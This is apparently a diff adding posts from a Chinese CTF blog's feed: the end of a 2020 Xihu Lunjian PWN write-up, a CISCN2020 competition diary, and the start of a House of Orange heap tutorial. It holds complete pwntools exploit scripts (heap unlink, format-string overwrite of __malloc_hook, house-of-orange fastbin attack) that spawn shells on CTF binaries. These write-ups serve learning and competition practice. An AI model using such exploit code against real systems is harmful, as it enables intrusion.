+def edit(idx,con):
+    io.sendlineafter(&quot;&amp;gt;&amp;gt;&quot;,'3')
+    io.sendlineafter(&quot;edit:&quot;,str(idx))
+    io.sendafter(&quot;info:&quot;,con)
+
+def show(idx):
+    io.sendlineafter(&quot;&amp;gt;&amp;gt;&quot;,'4')
+    io.sendlineafter(&quot;show:&quot;,str(idx))
+    
+def dbg():
+    gdb.attach(io)
+    pause()
+
+note_list = 0x00411830
+
+add(0x80,'asdf')
+add(0x80,'asdf')
+add(0x20,'/bin/shh\x00')
+payload = p32(0)+p32(0x81)+p32(note_list-0xc)+p32(note_list-0x8)
+payload += '\x00'*0x70
+payload += p32(0x80)+p32(0x88)
+edit(0,payload)
+free(1)
+payload = 'a'*0x8+p32(0x4117B4)+p32(4)
+edit(0,payload)
+show(0)
+io.recvuntil(&quot;info: &quot;)
+libc_base = u32(io.recv(4))-libc.sym['free']
+log.info(&quot;libc_base : &quot;+hex(libc_base))
+edit(0,p32(libc_base+libc.sym['system']))
+free(2)
+io.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;noleakfmt&quot;&gt;noleakfmt&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  char v3; // [rsp+4h] [rbp-Ch]
+  unsigned __int64 v4; // [rsp+8h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  alarm(0x1Eu);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  printf(&quot;gift : %p\n&quot;, &amp;amp;v3);
+  close(1);
+  while ( 1 )
+  {
+    _isoc99_scanf(&quot;%100s&quot;, byte_201040);
+    printf(byte_201040, byte_201040);
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;因为有&lt;code&gt;close(1)&lt;/code&gt;的存在，此题变得比较阴间。需要通过修改&lt;code&gt;stdout&lt;/code&gt;的&lt;code&gt;fileno&lt;/code&gt;为2才能进行输出，然后通过libc的指针得到shell。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def setnum1(tar,arg):
+    payload = '%'+str(tar&amp;amp;0xffff)+&quot;c%10$hn&quot;
+    io.sendline(payload)
+    payload = '%'+str(arg)+&quot;c%36$hhn&quot;
+    io.sendline(payload)
+
+def setnum2(tar,arg):
+    payload = '%'+str(tar&amp;amp;0xffff)+&quot;c%11$hn&quot;
+    io.sendline(payload)
+    payload = '%'+str(arg&amp;amp;0xffff)+&quot;c%37$hn&quot;
+    io.sendline(payload)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第一步 需要修改&lt;code&gt;printf&lt;/code&gt;的返回地址为&lt;code&gt;_start&lt;/code&gt;，用以得到libc和&lt;code&gt;stdout&lt;/code&gt;的指针。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;stack = int(io.recv(12),16)
+if (stack&amp;amp;0xffff) &amp;gt; 0x2000:
+    io.close()
+    continue
+log.info(&quot;stack : &quot;+hex(stack))
+setnum2(stack-0xc,0x17b0)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时栈上&lt;code&gt;%26$p&lt;/code&gt;的位置已经有了&lt;code&gt;stdout&lt;/code&gt;的地址，&lt;code&gt;%9$p&lt;/code&gt;有libc的地址。&lt;/p&gt;
+
+&lt;p&gt;第二步 修改&lt;code&gt;stdout+112&lt;/code&gt;为0x2，获得输出的机会。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;setnum1(stack-0x54,0x90)
+payload = '%'+str(2)+&quot;c%26$hhn&quot;
+io.sendline(payload)
+payload = '%8$p%9$p'
+io.sendline(payload)
+io.recvuntil(&quot;0x&quot;)
+pie = int(io.recv(12),16)-0x990
+io.recvuntil(&quot;0x&quot;)
+libc_base = int(io.recv(12),16)-0x20840
+log.info(&quot;pie : &quot;+hex(pie))
+log.info(&quot;libc_base : &quot;+hex(libc_base))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这样，我们已经有了libc地址，pie地址，任意写的权限。接下来改&lt;code&gt;__malloc_hook&lt;/code&gt;为&lt;code&gt;one_gadget&lt;/code&gt;，用&lt;code&gt;%99999c&lt;/code&gt;触发他。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def setnum3(tar,arg):
+    payload = '%'+str(tar&amp;amp;0xff)+&quot;c%10$hhn&quot;
+    io.sendline(payload)
+    payload = '%'+str(arg)+&quot;c%36$hhn&quot;
+    io.sendline(payload)
+
+payload = '%'+str((libc_base+libc.sym['__malloc_hook'])&amp;amp;0xff)+&quot;c%36$hhn&quot;
+io.sendline(payload)
+setnum3(stack-0x53,((libc_base+libc.sym['__malloc_hook'])&amp;gt;&amp;gt;8)&amp;amp;0xff)
+one = libc_base+0xf1207
+payload = '%'+str((stack-0x54)&amp;amp;0xff)+&quot;c%10$hhn&quot;
+io.sendline(payload)
+payload = '%'+str((one)&amp;amp;0xff)+&quot;c%26$hhn&quot;
+io.sendline(payload)
+payload = '%'+str((libc_base+libc.sym['__malloc_hook']+1)&amp;amp;0xff)+&quot;c%36$hhn&quot;
+io.sendline(payload)
+payload = '%'+str((one&amp;gt;&amp;gt;8)&amp;amp;0xff)+&quot;c%26$hhn&quot;
+io.sendline(payload)
+payload = '%'+str((libc_base+libc.sym['__malloc_hook']+2)&amp;amp;0xff)+&quot;c%36$hhn&quot;
+io.sendline(payload)
+payload = '%'+str((one&amp;gt;&amp;gt;16)&amp;amp;0xff)+&quot;c%26$hhn&quot;
+io.sendline(payload)
+io.sendline(&quot;%99999c&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这样就能得到shell了。&lt;/p&gt;
+
+&lt;p&gt;但是1号句柄还是error的，我们需要用重定向将1号句柄重定向到我们的2号有输出的句柄。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;io.sendline(&quot;exec 1&amp;gt;&amp;amp;2&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功。&lt;/p&gt;
+
+&lt;h4 id=&quot;exp-1&quot;&gt;exp&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+
+#io = process(&quot;./noleakfmt&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+context.log_level = 'debug'
+def setnum1(tar,arg):
+    payload = '%'+str(tar&amp;amp;0xffff)+&quot;c%10$hn&quot;
+    io.sendline(payload)
+    payload = '%'+str(arg)+&quot;c%36$hhn&quot;
+    io.sendline(payload)
+
+def setnum2(tar,arg):
+    payload = '%'+str(tar&amp;amp;0xffff)+&quot;c%11$hn&quot;
+    io.sendline(payload)
+    payload = '%'+str(arg&amp;amp;0xffff)+&quot;c%37$hn&quot;
+    io.sendline(payload)
+
+def setnum3(tar,arg):
+    payload = '%'+str(tar&amp;amp;0xff)+&quot;c%10$hhn&quot;
+    io.sendline(payload)
+    payload = '%'+str(arg)+&quot;c%36$hhn&quot;
+    io.sendline(payload)
+
+while True:
+    try:
+        io = process(&quot;./noleakfmt&quot;)
+        io.recvuntil(&quot;0x&quot;)
+        stack = int(io.recv(12),16)
+        if (stack&amp;amp;0xffff) &amp;gt; 0x2000:
+            io.close()
+            continue
+        log.info(&quot;stack : &quot;+hex(stack))
+        setnum2(stack-0xc,0x17b0)
+        setnum1(stack-0x54,0x90)
+        payload = '%'+str(2)+&quot;c%26$hhn&quot;
+        io.sendline(payload)
+        payload = '%8$p%9$p'
+        io.sendline(payload)
+        io.recvuntil(&quot;0x&quot;)
+        pie = int(io.recv(12),16)-0x990
+        io.recvuntil(&quot;0x&quot;)
+        libc_base = int(io.recv(12),16)-0x20840
+        log.info(&quot;pie : &quot;+hex(pie))
+        log.info(&quot;libc_base : &quot;+hex(libc_base))
+        payload = '%'+str((libc_base+libc.sym['__malloc_hook'])&amp;amp;0xff)+&quot;c%36$hhn&quot;
+        io.sendline(payload)
+        setnum3(stack-0x53,((libc_base+libc.sym['__malloc_hook'])&amp;gt;&amp;gt;8)&amp;amp;0xff)
+        one = libc_base+0xf1207
+        payload = '%'+str((stack-0x54)&amp;amp;0xff)+&quot;c%10$hhn&quot;
+        io.sendline(payload)
+        payload = '%'+str((one)&amp;amp;0xff)+&quot;c%26$hhn&quot;
+        io.sendline(payload)
+        payload = '%'+str((libc_base+libc.sym['__malloc_hook']+1)&amp;amp;0xff)+&quot;c%36$hhn&quot;
+        io.sendline(payload)
+        payload = '%'+str((one&amp;gt;&amp;gt;8)&amp;amp;0xff)+&quot;c%26$hhn&quot;
+        io.sendline(payload)
+        payload = '%'+str((libc_base+libc.sym['__malloc_hook']+2)&amp;amp;0xff)+&quot;c%36$hhn&quot;
+        io.sendline(payload)
+        payload = '%'+str((one&amp;gt;&amp;gt;16)&amp;amp;0xff)+&quot;c%26$hhn&quot;
+        io.sendline(payload)
+        io.sendline(&quot;%99999c&quot;)
+        io.sendline(&quot;exec 1&amp;gt;&amp;amp;2&quot;)
+        io.interactive()
+    except:
+        io.close()
+        continue
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;有一个ezhttp，直接爆破，我本地写stdout失败了，没有复现成功。&lt;/p&gt;
+
+&lt;p&gt;总起来看，这几道题都不难。&lt;/p&gt;
+
+&lt;p&gt;我tcl。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="binary" /><summary type="html">2020西湖论剑PWN</summary></entry><entry><title type="html">CISCN2020游记</title><link href="http://localhost:4000/_posts/2020-09-23-CISCN2020%E6%B8%B8%E8%AE%B0/" rel="alternate" type="text/html" title="CISCN2020游记" /><published>2020-09-23T00:00:00+08:00</published><updated>2020-09-23T00:00:00+08:00</updated><id>http://localhost:4000/_posts/CISCN2020%E6%B8%B8%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-09-23-CISCN2020%E6%B8%B8%E8%AE%B0/">&lt;h1 id=&quot;ciscn2020游记&quot;&gt;CISCN2020游记&lt;/h1&gt;
+
+&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;今年暑假，AiDai突然给👴报了一个国赛。我寻思着就重在参与吧，反正闲着也是闲着，并不抱有太大希望。&lt;/p&gt;
+
+&lt;h2 id=&quot;初赛&quot;&gt;初赛&lt;/h2&gt;
+
+&lt;p&gt;选择题，随便答，随缘答。&lt;/p&gt;
+
+&lt;p&gt;然后打ctf那一天我正好买了mac，花半天配置mac，到晚上看题的时候已经被队友带飞了。盯着nofree(house_of_orange)看了半天，寻思着有点思路，直接开打，做到半夜一点半左右出了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
+elf = ELF(&quot;./nofree&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+#context.log_level = 'debug'
+
+def add(idx,size,con):
+    io.sendlineafter(&quot;choice&amp;gt;&amp;gt; &quot;,'1')
+    io.sendlineafter(&quot;idx:&quot;,str(idx))
+    io.sendlineafter(&quot;size: &quot;,str(size))
+    io.sendafter(&quot;content: &quot;,con)
+    
+def edit(idx,con):
+    io.sendlineafter(&quot;choice&amp;gt;&amp;gt;&quot;,'2')
+    io.sendlineafter(&quot;idx:&quot;,str(idx))
+    io.sendafter(&quot;content: &quot;,con)
+
+ret = 0x0000000000400C34
+buf = 0x6020c0
+chunk1 = 0x6021d0
+
+memset_got = 0x602038
+strdup_got = 0x602068
+puts_plt = 0x4006D0
+
+#io = process(&quot;./nofree&quot;)
+io = remote(&quot;101.200.53.148&quot;,12301)
+for i in range(30):    
+    add(0,0x70,'a'*0x70)
+for i in range(2):
+    add(0,0x90,'a'*0x10)
+add(0,0x90,'a'*0x20)
+edit(0,'\x00'*0x28+p64(0x91))
+add(1,0x90,'a'*0x90)
+edit(0,'\x00'*0x28+p64(0x71)+p64(chunk1))
+add(0,0x90,'a'*0x60)
+add(1,0x70,'a')
+add(0,0x70,'a'*0x60)
+edit(0,p64(memset_got)+p64(0x90))
+edit(2,p64(ret))
+for i in range(28):
+    add(1,0x70,'a'*0x70)
+for i in range(3):
+    add(1,0x70,'a'*0x10+'\x00')
+edit(0,p64(buf+0x90)+p64(0x90))
+edit(2,'a'*0x50)
+add(2,0x70,'a'*0x20+'\x00')
+edit(2,'\x00'*0x28+p64(0xb1))
+add(1,0x90,'a'*0x90)
+payload = '\x00'*0x28+p64(0x91)+p64(0)+p64(buf-0x10)
+edit(2,payload)
+add(1,0x90,'a'*0x80+'\x00')
+edit(0,p64(strdup_got))
+edit(2,p64(puts_plt))
+add(1,0x20,'\xa0')
+libc.address = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4ba0
+log.info('libc.address : '+hex(libc.address))
+edit(2,p64(libc.sym['system']))
+add(1,0x20,'/bin/sh\x00')
+io.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;跟AiDai说说思路，睡觉。&lt;/p&gt;
+
+&lt;p&gt;后来听说还有更简单的思路，不管了。&lt;/p&gt;
+
+&lt;h2 id=&quot;复赛&quot;&gt;复赛&lt;/h2&gt;
+
+&lt;h3 id=&quot;第一天&quot;&gt;第一天&lt;/h3&gt;
+
+&lt;p&gt;这时候已经开学了，👴们直接到实验室整了张大桌子四个人一起打。Coin一看没密码学直接弃赛去打csp去了。就中午来送了个饭。&lt;/p&gt;
+
+&lt;p&gt;隔壁web手出了一个，拉胯。&lt;/p&gt;
+
+&lt;p&gt;AiDai直接拉出House_of_husk照着poc改脚本，秒一道pwn，一血。&lt;/p&gt;
+
+&lt;p&gt;之后第二道pwn开沙箱，我没有控制程序流的思路。aidai看了有思路，但是不会拿flag。我直接翻出以前的博客，打free_hook写setcontext拿到flag。&lt;/p&gt;
+
+&lt;p&gt;第三道题出了个大伏笔。明明是个UAF，aidai非要填满tcache去拿double_free。结果chunk数量少了2个，没法拿到shell。这时候其实已经有doublefree了，直接free然后用另外一个指针edit，能秒。大伏笔，出了这题能进前10。&lt;/p&gt;
+
+&lt;p&gt;fix不太会，好几个直接改free_plt得分不高。&lt;/p&gt;
+
+&lt;p&gt;晚上去日欣吃一顿，整了点🔥。约定要是进了决赛，👴们再吃一顿。不是，应该是为了再吃一顿，👴们要进决赛。&lt;/p&gt;
+
+&lt;h3 id=&quot;第二天&quot;&gt;第二天&lt;/h3&gt;
+
+&lt;p&gt;Coin跨行打web。偶然间看了一眼robots.txt，发现漏洞直接给出了。&lt;/p&gt;
+
+&lt;p&gt;然后第二个伏笔又来了。AiDai的orange不熟，我的也半吊。两个fastbin打hook的思路都出来了，结果因为没有消耗尽堆之后进行house，导致两个fastbin太远，没法覆盖。倒数第10分钟找到方法，时间不够，GG。&lt;/p&gt;
+
+&lt;p&gt;fix的时候另外两个👴又提前半小时跑了，到最后web有一道题没人管，aidai直接把正则全给禁了，草。&lt;/p&gt;
+
+&lt;p&gt;第二天的fix思路异常清晰，改size改指针啥的。pwn全部fix成功。&lt;/p&gt;
+
+&lt;h2 id=&quot;等&quot;&gt;等&lt;/h2&gt;
+
+&lt;p&gt;打完这一套，fish-farming战队排名第16，生死边缘疯狂徘徊。然后就是漫长的等build分数时间。&lt;/p&gt;
+
+&lt;p&gt;前几天刚出了build分数，排名又涨了，涨到13，但是还是生死线。&lt;/p&gt;
+
+&lt;p&gt;昨天说多晚也要出成绩，出nm呢。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/439837D512B89F77410408CA7CCA7403.jpg&quot; alt=&quot;出nm呢&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;今天也是昨天？&lt;/p&gt;
+
+&lt;p&gt;今天刚出成绩，进了15队，擦边进决赛，爽。&lt;/p&gt;
+
+&lt;h2 id=&quot;此刻所想之事&quot;&gt;此刻所想之事&lt;/h2&gt;
+
+&lt;p&gt;餐厅吃啥？烤鸭拌饭，加一大坨沙拉。&lt;/p&gt;
+
+&lt;p&gt;一会儿喝啥？楼下贩卖机，挑个最贵的。寻思就是魔爪了，一看拿铁8块，来一个。一出来300ml，黑。喝了一口，真不戳。上流人的咖啡真不戳。&lt;/p&gt;
+
+&lt;p&gt;公费武汉旅游，我来了！目标国赛三等奖，冲！！！&lt;/p&gt;
+
+&lt;h1 id=&quot;ylbsb&quot;&gt;YLBSB&lt;/h1&gt;
+
+&lt;h2 id=&quot;起飞&quot;&gt;起飞&lt;/h2&gt;
+
+&lt;p&gt;比赛通知不知道咋滴突然就下来了，👴们13擦边进了决赛。马上开始办事去武汉。看车票，问报销，请课假，收拾东西，一套操作直接上了火车。&lt;/p&gt;
+
+&lt;h3 id=&quot;前奏&quot;&gt;前奏&lt;/h3&gt;
+
+&lt;p&gt;我们这次来武汉的目的大约有三个：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;吃&lt;/li&gt;
+  &lt;li&gt;报销&lt;/li&gt;
+  &lt;li&gt;抽奖&lt;/li&gt;
+  &lt;li&gt;混个三等奖&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;所以由此看出头等大事是口乞。来武汉坐了9小时的高铁，连中午饭都没吃，所以下车第一件事就是找个饭店把饭给吃了。&lt;/p&gt;
+
+&lt;h4 id=&quot;火锅&quot;&gt;&lt;strong&gt;火锅&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;上嗨名单。&lt;/p&gt;
+
+&lt;p&gt;鸳鸯锅，羊肉+牛肉+五花肉，用来涮。加虾饺嗨带小菜。点了几串烤牛油，一人一串分着吃了。&lt;/p&gt;
+
+&lt;p&gt;就下面这个。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/40726CA5A7D576982C442ADC236D60BA.jpg&quot; alt=&quot;吃火锅&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之所以上嗨名单，是因为吃的实在是一般，加上蘸料能放的料实在是太少，餐具都是一次性的。实在是享受不起，告辞，嗨名单。&lt;/p&gt;
+
+&lt;h4 id=&quot;小炒&quot;&gt;&lt;strong&gt;小炒&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;白名单。&lt;/p&gt;
+
+&lt;p&gt;第二天晚上AiDai建议去吃点小炒，直接楼下找了一家店，三个人遵循n点菜法凑了一顿。&lt;/p&gt;
+
+&lt;p&gt;两荤一素，小炒肉有一股烧烤的香味，毛血旺量大味香，素菜里面带一点肉块，一顿人均30左右的饭，还可以开发票，血赚。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/QQ20201002-0.jpg&quot; alt=&quot;小炒&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;除了米饭比较少，其他的都挺棒，白名单。&lt;/p&gt;
+
+&lt;h2 id=&quot;比赛开始&quot;&gt;比赛开始&lt;/h2&gt;
+
+&lt;p&gt;主办方还是在比赛之前泄露了座位图。👴一看立马傻了。具体如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/CISCN2020/98841A63-8232-443D-A837-032951A2F1CE.png&quot; alt=&quot;座位图&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;相邻位置有南梦👴👴，隔壁队伍是天枢，斜对面还有高强度对线的嗨工带，中南带学一个队。被大佬包围，不知所措。&lt;/p&gt;
+
+&lt;p&gt;比赛开始十几分钟，我们意识到主办方没有收手机，于是我趁机拍了一张照片（南梦爷爷上镜）。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/QQ20201002-1.jpg&quot; alt=&quot;比赛开始&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;于是寻思着开个热点看一下，结果直接傻了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/截屏2020-09-28 上午8.35.39.png&quot; alt=&quot;热点1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;收掉手机之后热点数量完全没有变过。&lt;/p&gt;
+
+&lt;h3 id=&quot;载入史册的awd&quot;&gt;载入史册的AWD&lt;/h3&gt;
+
+&lt;p&gt;包括以下要素：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;现场85队。&lt;/li&gt;
+  &lt;li&gt;交flag需要验证码。&lt;/li&gt;
+  &lt;li&gt;交flag需要10秒的cd。&lt;/li&gt;
+  &lt;li&gt;每队的靶机随机获得一种属性。&lt;/li&gt;
+  &lt;li&gt;重开，并且换模式。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;接下来一个一个发瓜。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;AWD交flag带cd还有验证码，实在是有点龙鸣。我们队做出一个web，全程手动提交flag。每一轮flag刷新之后可以再提交一次，靠着这个苟了很久。显然，在验证码和自己的亲 之间，ylb选择了前者。有的队伍甚至中午左右调好了OCR识别验证码，结果平台越来越卡，后来干脆直接挂了？&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;现场85队，一开始服务器还撑得住，各种操作都比较流畅。后来发现这其实是个错觉， 从一开始有些队伍就看不到web和pwn中的某一道题目。然后到12点左右的时候出现情况了。一开始是我的账号突然就登不上去了，找管理人员，他说等一会儿工作人员正在修理。后来直接就是pwn的除了pwn5之外的靶机全部都登录不了了。直接找工作人员，工作人员给把请况记了下来。不过5分钟，平台崩了。&lt;/li&gt;
+  &lt;li&gt;从下午两点左右开始吃，吃到三点左右。平台开了，但是数据没了。这时候第4个要素来了。aidai在加固阶段连不上自己的靶机了，可以连别人的。但是一会儿又翻转过来了，他又可以连别人的，连不了自己的。就非常奇怪。我们是全程可以连自己的，连不了别人的。后来过了一段时间，谁的靶机都连不了了，但是分数却一直在掉。自己都连不上还在被打？喵喵喵喵？&lt;/li&gt;
+  &lt;li&gt;从三点半之后左右平台又崩了。之后ylb一直装死，再也没有把平台救过来。之后看到一张截图：《运维在抽烟》，不好找就没找那张截图了。茶歇去拿零食，吃了一下午把胃给吃坏了。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/摄像头快照 2020-09-28 时间 下午5.39.19.png&quot; alt=&quot;茶歇&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;解题赛&quot;&gt;解题赛&lt;/h3&gt;
+
+&lt;p&gt;第二天临时改了比赛规则，从AWD改成了解题赛。&lt;/p&gt;
+
+&lt;p&gt;比赛没开始就来了一个开胃小菜。ylb的分数解决方案是第一天的分数和第二天的分数乘一定的比例，没有交flag的队伍获得其他队伍的平均分。刚出了这个方案，嗨工带的师傅马上提出了异议。但是ylb的工作人员直接就没素质，直接甩下一句“你不想打可以出去”。然后好几个队伍都忍不住了。瞬间好多师傅全过去对线。最后在华科老师的维持之下，逐渐平息了下来。&lt;/p&gt;
+
+&lt;p&gt;之后打开wifi。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../../assets/CISCN2020/截屏2020-09-29 下午12.24.22.png&quot; alt=&quot;ylbsb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;本以为有密码学可以直接起飞的。结果密码学只有一道龙鸣题目，解出来60多分，连跳高都不算。&lt;/p&gt;
+
+&lt;p&gt;PWN1是一道arm的栈溢出，aidai没环境，放了。PWN2是一道vmpwn，aidai和我都不会，放了。PWN3格式化字符串，把stdout关了，全场就1解，放了。gg。fix阶段没有什么好说的。不知道是要交wp还是什么原因，全场均分3分左右，ylbsb。&lt;/p&gt;
+
+&lt;h3 id=&quot;奖&quot;&gt;奖&lt;/h3&gt;
+
+&lt;p&gt;三等奖，预期。&lt;/p&gt;
+
+&lt;h1 id=&quot;总结&quot;&gt;总结&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;收获1：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;去武汉旅了一次游。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;收获2：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;线下认识了南梦师傅和小鹿师傅，并且在赛后成功进入了V&amp;amp;N战队。👴感觉真正的CTF生涯正式开始了。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;收获3：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;👴认识到了pwn的题目正在从glibc转移到arm，vm，kernel等等的非常规方向转移，所以说下半年的研究重点应该在非常规的pwn题目上。这也是对自己能力的一种提高吧。&lt;/p&gt;</content><author><name></name></author><category term="_posts" /><category term="life" /><category term="binary" /><summary type="html">CISCN2020游记</summary></entry><entry><title type="html">House of orange</title><link href="http://localhost:4000/_posts/2020-09-06-House-of-orange/" rel="alternate" type="text/html" title="House of orange" /><published>2020-09-06T00:00:00+08:00</published><updated>2020-09-06T00:00:00+08:00</updated><id>http://localhost:4000/_posts/House%20of%20orange</id><content type="html" xml:base="http://localhost:4000/_posts/2020-09-06-House-of-orange/">&lt;h1 id=&quot;house-of-&quot;&gt;House of 🍊&lt;/h1&gt;
+
+&lt;h2 id=&quot;利用原理&quot;&gt;利用原理&lt;/h2&gt;
+
+&lt;p&gt;🍊的&lt;strong&gt;利用背景&lt;/strong&gt;：程序根本没有free函数。&lt;/p&gt;
+
+&lt;p&gt;结果：能把原来的top chunk放进unsorted bin。从而在没有free的情况下得到一个unsorted bin。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;检测机制&lt;/strong&gt;：&lt;/p&gt;
+
+&lt;p&gt;top chunk不满足分配要求时进入以下分支：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Otherwise, relay to handle system-dependent cases */
+ else
+	{
+		 void *p = sysmalloc(nb, av); 
+		if (p != NULL &amp;amp;&amp;amp; __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p; 
+	}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;调用sysmalloc的形式向系统申请堆，我们需要用brk的形式申请堆，这样就可以让原来的top chunk进unsorted bin了。所以进行brk扩展的条件：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;if ((unsigned long)(nb) &amp;gt;= (unsigned long)(mp_.mmap_threshold) &amp;amp;&amp;amp; (mp_.n_mmaps &amp;lt; mp_.n_mmaps_max))&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;malloc的尺寸不大于mp_.mmap_threshold，小于128k。&lt;/p&gt;
+
+&lt;p&gt;另外在sysmalloc中还有对top chunk的检测：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;assert((old_top == initial_top(av) &amp;amp;&amp;amp; old_size == 0) || 
+	((unsigned long) (old_size) &amp;gt;= MINSIZE &amp;amp;&amp;amp;
+	 prev_inuse(old_top) &amp;amp;&amp;amp; 
+	((unsigned long)old_end &amp;amp; pagemask) == 0));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;top chunk的大小大于MINSIZE(0x10)，inuse位为1，而且要页对齐。&lt;/p&gt;
+
+&lt;p&gt;所以条件为&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;伪造的chunk的size要页对齐。(通俗说就是后三个十六进制位为0)&lt;/li&gt;
+  &lt;li&gt;size要大于MINSIZE。&lt;/li&gt;
+  &lt;li&gt;size要小于下一个申请的chunk的size+MINSIZE。&lt;/li&gt;
+  &lt;li&gt;inuse位置为1。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define fake_size 0x1fe1 
+
+int main(void)
+ { 
+	void *ptr; 
+	ptr=malloc(0x10); 
+	ptr=(void *)((int)ptr+24); 
+	*((long long*)ptr)=fake_size;
+	malloc(0x2000); 
+	malloc(0x60); 
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;0x1fe1对齐页，再malloc0x2000直接进unsorted bin。&lt;/p&gt;
+
+&lt;p&gt;如果 top chunk 的size比较小，也可能进fastbin。&lt;/p&gt;
+
+&lt;h2 id=&quot;利用方法&quot;&gt;利用方法&lt;/h2&gt;
+
+&lt;p&gt;第一种利用方法是获得一个fastbin，然后再通过溢出进行fastbin attack。&lt;/p&gt;
+
+&lt;p&gt;一个例子是ciscn2020的nofree。（放在下面）&lt;/p&gt;
+
+&lt;p&gt;第二种利用方法是获得一个unsorted bin，然后进行unsorted bin attack或者是FSOP。&lt;/p&gt;
+
+&lt;p&gt;一个例子是houseoforange_hitcon_2016，在House of 🍊之后直接接FSOP。&lt;/p&gt;
+
+&lt;h2 id=&quot;实例分析&quot;&gt;实例分析&lt;/h2&gt;
+
+&lt;h3 id=&quot;ciscn2020-nofree&quot;&gt;ciscn2020 nofree&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt; ○ file nofree
+nofree: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ce6a329974820359e8ff0d9bc08f37c752dbd40b, stripped
+ ○ checksec nofree
+[*] '/home/surager/nofree/nofree'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;64位的动态链接ELF，没有开启PIE保护。&lt;/p&gt;
+
